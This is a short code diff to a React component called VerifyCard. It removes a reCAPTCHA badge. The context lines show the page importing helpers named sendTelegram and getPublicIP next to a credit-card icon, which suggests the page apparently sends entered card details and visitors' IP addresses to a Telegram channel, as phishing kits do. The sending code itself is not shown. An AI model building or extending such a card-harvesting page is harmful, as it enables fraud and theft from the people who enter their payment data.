@@ -3,7 +3,6 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, CreditCard } from "lucide-react";
-import { RecaptchaBadge } from "@/components/recaptcha-badge";
 import { sendTelegram, getPublicIP } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
@@ -378,7 +377,6 @@ export default function VerifyCard() {
         </span>
       </div>
 
-      <RecaptchaBadge />
     </div>
   );
 }
